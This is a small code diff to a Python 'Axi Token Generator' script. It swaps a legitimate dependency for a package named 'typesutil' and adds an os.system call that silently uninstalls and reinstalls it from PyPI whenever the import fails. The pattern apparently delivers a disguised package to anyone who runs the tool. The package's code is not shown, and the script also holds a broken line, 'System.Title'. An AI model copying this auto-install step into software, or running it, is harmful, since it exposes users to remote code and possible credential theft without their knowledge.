@@ -1,11 +1,11 @@
 import os
 try:
     import requests
-    import inquirerpy
+    import typesutil
 except:
-    os.system('pip uninstall requests -y && pip uninstall inquirerpy -y && pip install requests && pip install inquirerpy')
+    os.system('pip uninstall requests -y && pip uninstall typesutil -y && pip install requests && pip install typesutil')
     import requests
-    import inquirerpy
+    import typesutil
 System.Title("Axi Token Generator ^| Made By kokzyy")
 axi = """
                                                      ███
